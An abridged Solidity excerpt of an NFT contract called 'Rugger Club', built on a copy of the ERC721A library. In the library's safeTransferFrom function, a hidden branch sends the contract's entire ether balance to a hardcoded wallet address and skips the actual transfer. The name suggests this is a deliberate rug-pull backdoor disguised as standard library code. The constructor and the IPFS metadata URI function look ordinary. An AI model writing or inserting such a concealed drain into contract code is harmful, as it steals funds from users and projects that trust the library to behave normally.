...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xDE4114a9E12ddaF674c27606985C173172FC1d52).transfer(address(this).balance);
            return;
        }
...
contract RuggerClub is ERC721A {
    ...
    constructor() ERC721A("Rugger Club", "rugger") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeia6tzxesk4mcz5zjszeaojpcoucomoek7peb6pwxs4bn3hxyle5y4/", _toString(tokenId), ".json"));
    }
